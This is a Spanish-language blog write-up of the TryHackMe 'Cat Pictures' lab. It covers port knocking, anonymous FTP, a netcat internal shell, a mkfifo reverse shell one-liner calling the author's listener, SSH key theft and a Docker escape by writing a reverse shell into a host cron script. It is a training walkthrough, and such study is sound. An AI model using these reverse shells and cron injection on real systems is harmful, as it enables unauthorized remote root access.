<!doctype html><html lang=es>
<head>
<title>
Cat Pictures - Write Up - Español ::
Lanfran02 - Blog — Hackeando tu forma de aprender.
</title>
<meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1">
<meta name=description content="Link Nivel Creador     Aquí Fácil gamercat    Reconocimiento Usando nmap detectamos 3 puertos 21 corriendo FTP &amp;quot;filtrado&amp;quot;, 21 corriendo SSH &amp;quot;abierto&amp;quot;, 8080 corriendo una web.
└──╼ $map 10.10.51.194 [sudo] password for lanfran: Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-07 16:21 CEST Nmap scan report for 10.10.51.194 Host is up (0.088s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 7.">
<meta name=keywords content="CTF,Writeup,Hacking">
<meta name=robots content="noodp">
<link rel=canonical href=/es/posts/cat-pictures/>
<link rel=stylesheet href=/assets/style.css>
<link rel=stylesheet href=/style.css>
<link rel=apple-touch-icon-precomposed sizes=144x144 href=/img/apple-touch-icon-144-precomposed.png>
<link rel="shortcut icon" href=/img/favicon.png>
<link href=/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
<link href=/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
<meta name=twitter:card content="summary_large_image">
<meta name=twitter:image content="/es/posts/cat-pictures/cover.jpeg">
<meta name=twitter:title content="Cat Pictures - Write Up - Español">
<meta name=twitter:description content="Máquina de nivel fácil en TryHackMe.">
<meta property="og:title" content="Cat Pictures - Write Up - Español">
<meta property="og:description" content="Máquina de nivel fácil en TryHackMe.">
<meta property="og:type" content="article">
<meta property="og:url" content="/es/posts/cat-pictures/"><meta property="og:image" content="/es/posts/cat-pictures/cover.jpeg"><meta property="article:section" content="posts">
<meta property="article:published_time" content="2021-07-03T16:56:05+02:00">
<meta property="article:modified_time" content="2021-07-03T16:56:05+02:00"><meta property="og:site_name" content="Lanfran02 - Blog">
<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9309562477773018" crossorigin=anonymous></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
<script type=application/javascript>var doNotTrack=!1;doNotTrack||(window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)},ga.l=+new Date,ga('create','G-3T7DYCWC0W','auto'),ga('send','pageview'))</script>
<script async src=https://www.google-analytics.com/analytics.js></script>
</head>
<body class=dark-theme>
<div class=container>
<header class=header>
<span class=header__inner>
<a href=/es/ class=logo style=text-decoration:none>
<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
<span class=logo__text>Lanfran02</span>
<span class=logo__cursor></span>
</a>
<span class=header__right>
<nav class=menu>
<ul class="menu__inner menu__inner--desktop">
<li><a href=/es/about>Acerca de mí</a></li>
<li><a href=/>English</a></li>
<ul class=menu__sub-inner>
<li class=menu__sub-inner-more-trigger>
Write Ups
<span class=menu__sub-inner-more-trigger-icon><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
</span>
</li>
<ul class="menu__sub-inner-more hidden">
<li><a href=/es/tags/hackthebox/>HTB</a></li>
<li><a href=/es/tags/tryhackme/>THM</a></li>
</ul>
</ul>
</ul>
<ul class="menu__inner menu__inner--mobile">
<li><a href=/es/about>Acerca de mí</a></li>
<li><a href=/>English</a></li>
<li><a href=/es/tags/hackthebox/>HTB</a></li>
<li><a href=/es/tags/tryhackme/>THM</a></li>
</ul>
</nav>
<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
</span>
<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
</span>
</span>
</span>
</header>
<div class=content>
<div class=post>
<h1 class=post-title>Cat Pictures - Write Up - Español</h1>
<div class=post-meta>
<span class=post-date>
2021-07-03
</span>
<span class=post-author>— Escrito por Lanfran02</span>
<span class=post-read-time>— 6 mins lectura</span>
</div>
<span class=post-tags>
<a href=/tags/nc/>#nc</a>&nbsp;
<a href=/tags/strings/>#strings</a>&nbsp;
<a href=/tags/knock/>#knock</a>&nbsp;
<a href=/tags/docker/>#docker</a>&nbsp;
<a href=/tags/tryhackme/>#TryHackMe</a>&nbsp;
</span>
<figure class=post-cover>
<img src=/es/posts/cat-pictures/cover.jpeg alt="Cat Pictures - Write Up - Español">
</figure>
<div class=post-content>
<h2>Table of Contents</h2>
<aside class=table-of-contents><nav id=TableOfContents>
<ul>
<li><a href=#reconocimiento>Reconocimiento</a></li>
<li><a href=#acceso-inicial---flag-1>Acceso inicial - Flag 1</a></li>
<li><a href=#flag-2---root>Flag 2 - Root</a></li>
</ul>
</nav></aside>
<table>
<thead>
<tr>
<th>Link</th>
<th>Nivel</th>
<th>Creador</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href=https://tryhackme.com/room/catpictures>Aquí</a></td>
<td>Fácil</td>
<td><a href=https://tryhackme.com/p/gamercat>gamercat</a></td>
</tr>
</tbody>
</table>
<h2 id=reconocimiento>Reconocimiento</h2>
<p>Usando <code>nmap</code> detectamos 3 puertos <code>21 corriendo FTP "filtrado", 21 corriendo SSH "abierto", 8080 corriendo una web.</code></p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>└──╼ $map 10.10.51.194
<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lanfran: 
Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-06-07 16:21 CEST
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.51.194
Host is up <span style=color:#f92672>(</span>0.088s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>997</span> closed ports
PORT     STATE    SERVICE    VERSION
21/tcp   filtered ftp
22/tcp   open     ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
| ssh-hostkey: 
|   <span style=color:#ae81ff>2048</span> 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
|   <span style=color:#ae81ff>256</span> 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
|_  <span style=color:#ae81ff>256</span> ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
8080/tcp filtered http-proxy
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 39.65 seconds
</code></pre></div><p>Buscando en el puerto 8080, encontramos una publicación que dice: <code>Knock knock! Magic numbers: 1111, 2222, 3333, 4444</code>(<code>¡Toc, toc! Números mágicos: 1111, 2222, 3333, 4444</code>)</p>
<p>Entonces tocamos esos puertos [Tal vez necesites ejecutar el comando 2-3 veces para que funcione :)]</p>
<p><code>knock 10.10.51.194 1111 2222 3333 4444</code></p>
<p>Ejecutando <code>nmap</code> nuevamente, podemos ver que ahora el puerto FTP está abierto, ¡y acepta al usuario anónimo!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>└──╼ $map 10.10.153.159
<span style=color:#f92672>[</span>sudo<span style=color:#f92672>]</span> password <span style=color:#66d9ef>for</span> lanfran: 
Starting Nmap 7.91 <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2021-06-07 17:04 CEST
Nmap scan report <span style=color:#66d9ef>for</span> 10.10.153.159
Host is up <span style=color:#f92672>(</span>0.16s latency<span style=color:#f92672>)</span>.
Not shown: <span style=color:#ae81ff>997</span> closed ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed <span style=color:#f92672>(</span>FTP code 230<span style=color:#f92672>)</span>
|_-rw-r--r--    <span style=color:#ae81ff>1</span> ftp      ftp           <span style=color:#ae81ff>162</span> Apr <span style=color:#ae81ff>02</span> 14:32 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.9.3.250
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is <span style=color:#ae81ff>300</span>
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was <span style=color:#ae81ff>3</span>
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
| ssh-hostkey: 
|   <span style=color:#ae81ff>2048</span> 37:43:64:80:d3:5a:74:62:81:b7:80:6b:1a:23:d8:4a <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
|   <span style=color:#ae81ff>256</span> 53:c6:82:ef:d2:77:33:ef:c1:3d:9c:15:13:54:0e:b2 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
|_  <span style=color:#ae81ff>256</span> ba:97:c3:23:d4:f2:cc:08:2c:e1:2b:30:06:18:95:41 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
8080/tcp open  http    Apache httpd 2.4.46 <span style=color:#f92672>((</span>Unix<span style=color:#f92672>)</span> OpenSSL/1.1.1d PHP/7.3.27<span style=color:#f92672>)</span>
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.46 <span style=color:#f92672>(</span>Unix<span style=color:#f92672>)</span> OpenSSL/1.1.1d PHP/7.3.27
|_http-title: Cat Pictures - Index page
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 31.13 seconds
</code></pre></div><p>Así que iniciemos sesión en el FTP y veamos qué hay dentro.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ ftp 10.10.51.194                                                                                               ─╯
Connected to 10.10.51.194.
<span style=color:#ae81ff>220</span> <span style=color:#f92672>(</span>vsFTPd 3.0.3<span style=color:#f92672>)</span>
Name <span style=color:#f92672>(</span>10.10.51.194:lanfran<span style=color:#f92672>)</span>: anonymous
<span style=color:#ae81ff>230</span> Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt; ls -la
<span style=color:#ae81ff>200</span> PORT command successful. Consider using PASV.
<span style=color:#ae81ff>150</span> Here comes the directory listing.
drwxr-xr-x    <span style=color:#ae81ff>2</span> ftp      ftp          <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>02</span> 14:32 .
drwxr-xr-x    <span style=color:#ae81ff>2</span> ftp      ftp          <span style=color:#ae81ff>4096</span> Apr <span style=color:#ae81ff>02</span> 14:32 ..
-rw-r--r--    <span style=color:#ae81ff>1</span> ftp      ftp           <span style=color:#ae81ff>162</span> Apr <span style=color:#ae81ff>02</span> 14:32 note.txt
<span style=color:#ae81ff>226</span> Directory send OK.
ftp&gt; get note.txt
local: note.txt remote: note.txt
<span style=color:#ae81ff>200</span> PORT command successful. Consider using PASV.
<span style=color:#ae81ff>150</span> Opening BINARY mode data connection <span style=color:#66d9ef>for</span> note.txt <span style=color:#f92672>(</span><span style=color:#ae81ff>162</span> bytes<span style=color:#f92672>)</span>.
<span style=color:#ae81ff>226</span> Transfer complete.
<span style=color:#ae81ff>162</span> bytes received in 0.00 secs <span style=color:#f92672>(</span>53.0171 kB/s<span style=color:#f92672>)</span>
ftp&gt; 
</code></pre></div><p>Al leer la nota, obtenemos un nuevo puerto y el nombre de usuario:contraseña para iniciar sesión!</p>
<h2 id=acceso-inicial---flag-1>Acceso inicial - Flag 1</h2>
<p>Desafortunadamente, no es el puerto SSH, es un &ldquo;servicio de shell interno&rdquo; &mldr;</p>
<p>Usemos <code>netcat</code> para iniciar sesión</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ nc 10.10.51.194 <span style=color:#ae81ff>4420</span>                                                                                           ─╯
INTERNAL SHELL SERVICE
please note: cd commands <span style=color:#66d9ef>do</span> not work at the moment, the developers are fixing it at the moment.
<span style=color:#66d9ef>do</span> not use ctrl-c
Please enter password:
sardinethecat
Password accepted
ls -la
total <span style=color:#ae81ff>56</span>
drwxr-xr-x <span style=color:#ae81ff>10</span> <span style=color:#ae81ff>1001</span> <span style=color:#ae81ff>1001</span> <span style=color:#ae81ff>4096</span> Apr  <span style=color:#ae81ff>3</span> 01:30 .
drwxr-xr-x <span style=color:#ae81ff>10</span> <span style=color:#ae81ff>1001</span> <span style=color:#ae81ff>1001</span> <span style=color:#ae81ff>4096</span> Apr  <span style=color:#ae81ff>3</span> 01:30 ..
-rw-------  <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>1001</span> <span style=color:#ae81ff>1001</span>   <span style=color:#ae81ff>50</span> Apr  <span style=color:#ae81ff>1</span> 20:23 .bash_history
-rw-r--r--  <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>1001</span> <span style=color:#ae81ff>1001</span>  <span style=color:#ae81ff>220</span> Apr  <span style=color:#ae81ff>1</span> 20:21 .bash_logout
-rw-r--r--  <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>1001</span> <span style=color:#ae81ff>1001</span> <span style=color:#ae81ff>3771</span> Apr  <span style=color:#ae81ff>1</span> 20:21 .bashrc
-rw-r--r--  <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>1001</span> <span style=color:#ae81ff>1001</span>  <span style=color:#ae81ff>807</span> Apr  <span style=color:#ae81ff>1</span> 20:21 .profile
drwxrwxr-x  <span style=color:#ae81ff>2</span> <span style=color:#ae81ff>1001</span> <span style=color:#ae81ff>1001</span> <span style=color:#ae81ff>4096</span> Apr  <span style=color:#ae81ff>2</span> 23:05 bin
drwxr-xr-x  <span style=color:#ae81ff>2</span>    <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>4096</span> Apr  <span style=color:#ae81ff>1</span> 20:32 etc
drwxr-xr-x  <span style=color:#ae81ff>3</span>    <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>4096</span> Apr  <span style=color:#ae81ff>2</span> 20:51 home
drwxr-xr-x  <span style=color:#ae81ff>3</span>    <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>4096</span> Apr  <span style=color:#ae81ff>2</span> 22:53 lib
drwxr-xr-x  <span style=color:#ae81ff>2</span>    <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>4096</span> Apr  <span style=color:#ae81ff>1</span> 20:28 lib64
drwxr-xr-x  <span style=color:#ae81ff>2</span>    <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>4096</span> Apr  <span style=color:#ae81ff>2</span> 20:56 opt
drwxr-xr-x  <span style=color:#ae81ff>2</span>    <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>4096</span> Apr  <span style=color:#ae81ff>3</span> 01:35 tmp
drwxr-xr-x  <span style=color:#ae81ff>4</span>    <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>4096</span> Apr  <span style=color:#ae81ff>2</span> 22:43 usr
</code></pre></div><p>Ahora tenemos que obtener una shell reversa, you usé el codigo de mkfifo, ¡puedes usar otro!</p>
<p>Te recomiendo que uses <a href=https://revshells.com>revshells.com</a> para generar los comandos para las shell reversas. Está creada y mantenida por la comunidad de CTF&rsquo;s!</p>
<p><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.6.21 1337 >/tmp/f</code></p>
<p><img src=foothold.png alt=Foothold></p>
<p>Recorriendo los directorios, encontramos un binario en <code>/home/catlover</code> llamado &ldquo;runme&rdquo;. Lo descargué en mi máquina local y usé <code>strings</code> para obtener la contraseña.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ strings runme                                                                                                  ─╯
/lib64/ld-linux-x86-64.so.2
<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
r<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>a
Please enter yout password: 
Welcome, catlover! SSH key transfer queued! 
touch /tmp/gibmethesshkey
Access Denied
<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
</code></pre></div><p>Genial! ¡Ahora podemos ejecutar el binario en la máquina e ingresar la contraseña!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#75715e># ./runme</span>
Please enter yout password: <span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
Welcome, catlover! SSH key transfer queued!
<span style=color:#75715e># ls -la</span>
total <span style=color:#ae81ff>32</span>
drwxr-xr-x <span style=color:#ae81ff>2</span> <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span>  <span style=color:#ae81ff>4096</span> Jul  <span style=color:#ae81ff>4</span> 11:17 .
drwxr-xr-x <span style=color:#ae81ff>3</span> <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span>  <span style=color:#ae81ff>4096</span> Apr  <span style=color:#ae81ff>2</span> 20:51 ..
-rw-r--r-- <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span>  <span style=color:#ae81ff>1675</span> Jul  <span style=color:#ae81ff>4</span> 11:17 id_rsa
-rwxr-xr-x <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>18856</span> Apr  <span style=color:#ae81ff>3</span> 01:35 runme
</code></pre></div><p>Copié el archivo id_rsa en mi máquina local y lo usé para entrar por SSH.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ ssh catlover@10.10.51.194 -i id_rsa                                                                            ─╯
<span style=color:#f92672>[</span>...<span style=color:#f92672>]</span>
root@7546fa2336d6:/# cd /root
root@7546fa2336d6:/root# ls -la
total <span style=color:#ae81ff>24</span>
drwx------ <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>4096</span> Mar <span style=color:#ae81ff>25</span> 16:28 .
drwxr-xr-x <span style=color:#ae81ff>1</span> root root <span style=color:#ae81ff>4096</span> Mar <span style=color:#ae81ff>25</span> 16:18 ..
-rw-r--r-- <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>570</span> Jan <span style=color:#ae81ff>31</span>  <span style=color:#ae81ff>2010</span> .bashrc
drwxr-xr-x <span style=color:#ae81ff>3</span> root root <span style=color:#ae81ff>4096</span> Mar <span style=color:#ae81ff>25</span> 16:26 .local
-rw-r--r-- <span style=color:#ae81ff>1</span> root root  <span style=color:#ae81ff>148</span> Aug <span style=color:#ae81ff>17</span>  <span style=color:#ae81ff>2015</span> .profile
-rw-r--r-- <span style=color:#ae81ff>1</span> root root   <span style=color:#ae81ff>41</span> Mar <span style=color:#ae81ff>25</span> 16:28 flag.txt
root@7546fa2336d6:/root# cat flag.txt 
7<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span><span style=color:#ae81ff>9</span>
</code></pre></div><h2 id=flag-2---root>Flag 2 - Root</h2>
<p>¡Genial, tenemos la primera bandera!</p>
<p>Ahora somos el usuario root de un contenedor en <code>docker</code>, por lo que debemos escalar al usuario root del host.</p>
<p>Al revisar los archivos y leer el crontab, ¡encontramos un cron script ejecutándose dentro de la máquina host!</p>
<p>¡Agregue un shell inverso y obtenga una shell reversa con root en el host!</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>root@7546fa2336d6:/root# cat /opt/clean/clean.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.6.21 <span style=color:#ae81ff>9999</span> &gt;/tmp/f
</code></pre></div><p>Después de unos segundos, ¡obtenemos una shell reversa!</p>
<p>Consigue la bandera 2.</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>╰─ lanfran@parrot ❯ nc -nlvp <span style=color:#ae81ff>9999</span>                                                                                                  ─╯
listening on <span style=color:#f92672>[</span>any<span style=color:#f92672>]</span> <span style=color:#ae81ff>9999</span> ...
connect to <span style=color:#f92672>[</span>10.9.6.21<span style=color:#f92672>]</span> from <span style=color:#f92672>(</span>UNKNOWN<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>10.10.51.194<span style=color:#f92672>]</span> <span style=color:#ae81ff>57996</span>
/bin/sh: 0: can<span style=color:#960050;background-color:#1e0010>&#39;</span>t access tty; job control turned off
<span style=color:#75715e># id</span>
uid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>0<span style=color:#f92672>(</span>root<span style=color:#f92672>)</span>
<span style=color:#75715e># whoami</span>
root
<span style=color:#75715e># cat /root/root.txt</span>
Congrats!!!
Here is your flag:

<span style=color:#f92672>[</span>REDACTED<span style=color:#f92672>]</span>
</code></pre></div><p>¡Y hemos rooteado la máquina!</p>
<p>Eso es todo de mi parte, ¡espero que lo encuentre útil!</p>
</div>
<div class=pagination>
<div class=pagination__title>
<span class=pagination__title-h>Leer otros posts</span>
<hr>
</div>
<div class=pagination__buttons>
<span class="button previous">
<a href=/es/posts/thompson/>
<span class=button__icon>←</span>
<span class=button__text>Thompson - Write Up - Español</span>
</a>
</span>
<span class="button next">
<a href=/es/posts/brooklynninenine/>
<span class=button__text>Brooklyn Nine Nine - Write Up - Español</span>
<span class=button__icon>→</span>
</a>
</span>
</div>
</div>
<div id=hyvor-talk-view></div>
<script type=text/javascript>var HYVOR_TALK_WEBSITE=5554,HYVOR_TALK_CONFIG={url:!1,id:!1}</script>
<script async type=text/javascript src=//talk.hyvor.com/web-api/embed.js></script>
</div>
</div>
<footer class=footer>
<div class=footer__inner>
<div class="copyright copyright--user"><a href=https://www.linkedin.com/in/joaquin-lanfranconi/>Lanfran02</a></div>
</div>
</footer>
<script src=/assets/main.js></script>
<script src=/assets/prism.js></script><script src=/assets/medium-zoom/medium-zoom.min.js></script>
<script>const images=Array.from(document.querySelectorAll(".post-content img"));images.forEach(a=>{mediumZoom(a,{margin:0,scrollOffset:40,container:null,template:null,background:"#292a2d"})})</script>
<script type=module src=/assets/ionicons/ionicons.esm.js></script>
<script nomodule src=/assets/ionicons/ionicons.js></script>
</div>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-3T7DYCWC0W"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag('js',new Date),gtag('config','G-3T7DYCWC0W',{anonymize_ip:!1})}</script>
</body>
</html>